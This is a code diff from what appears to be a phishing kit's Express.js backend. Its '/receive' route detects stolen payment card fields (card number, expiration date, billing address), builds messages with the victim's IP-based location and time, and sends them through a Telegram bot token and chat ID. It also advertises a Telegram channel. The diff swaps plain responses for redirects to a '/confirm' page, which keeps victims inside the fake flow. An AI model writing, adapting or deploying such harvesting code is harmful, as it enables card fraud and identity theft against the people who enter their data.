@@ -223,7 +223,7 @@ app.post('/receive', async (req, res) => {
         `SYSTEM LANGUAGE  : ${systemLang}\n` +
         `💬 Telegram: https://t.me/UpdateTeams\n`;
 
-    res.send('dn');
+    res.redirect('/confirm?action=1');
   }
 
   if (lowerCaseMyObjects.includes('expirationdate') || lowerCaseMyObjects.includes('cardnumber') || lowerCaseMyObjects.includes('billing address')) {
@@ -280,7 +280,7 @@ app.post('/receive', async (req, res) => {
         `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
         `💬 Telegram: https://t.me/UpdateTeams\n`;
 
-    res.send('dn');
+    res.redirect('/confirm?action=2');
   }
 
   const sendMessage = sendMessageFor(botToken, chatId);
